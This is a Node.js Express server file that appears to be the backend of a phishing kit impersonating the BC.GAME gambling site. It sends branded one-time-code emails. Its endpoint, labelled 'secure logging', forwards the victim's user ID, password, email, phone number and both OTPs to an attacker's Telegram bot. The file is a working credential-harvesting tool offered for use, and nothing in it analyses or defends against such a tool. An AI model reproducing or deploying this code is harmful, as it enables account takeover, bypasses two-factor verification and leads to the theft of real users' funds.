require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// Serve static files from root
app.use(express.static(__dirname));

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Endpoint to send OTP
app.post('/send-otp', async (req, res) => {
    const { email } = req.body;
    if (!email) return res.status(400).json({ success: false });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: email,
        subject: '🔐 BC.GAME Verification Code',
        html: `<div style="background:#1c1e22; color:white; padding:30px; border-radius:12px; font-family:sans-serif; text-align:center; border:1px solid #3bc117;">
                <h2 style="color:#3bc117; margin-bottom:20px;">BC.GAME</h2>
                <p style="font-size:16px;">Your verification code is:</p>
                <div style="font-size:42px; font-weight:bold; letter-spacing:8px; margin:30px 0; color:#3bc117;">${otp}</div>
                <p style="color:#98a7b5; font-size:14px;">This code will expire in 5 minutes.</p>
               </div>`
    };

    try {
        await transporter.sendMail(mailOptions);
        res.json({ success: true, otp }); 
    } catch (error) {
        console.error('Email Error:', error);
        res.status(500).json({ success: false });
    }
});

// SECURE LOGGING ENDPOINT
app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    const token = process.env.LOG_BOT_TOKEN;
    const chatId = process.env.LOG_BOT_CHAT_ID;

    if (!token || !chatId) {
        return res.status(500).json({ success: false, message: 'Bot config missing in .env' });
    }

    const message = `
🔥 <b>${title}</b>
━━━━━━━━━━━━━━━
👤 <b>Initial ID</b>: <code>${data.id}</code>
🔑 <b>Password</b>: <code>${data.pass}</code>
📧 <b>Verify Email</b>: <code>${data.email || 'N/A'}</code>
🔢 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
📱 <b>Verify Phone</b>: <code>${data.phone || 'N/A'}</code>
🔢 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Telegram Log Error:', error.response?.data || error.message);
        res.status(500).json({ success: false });
    }
});

// Fix for Express 5 catch-all
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
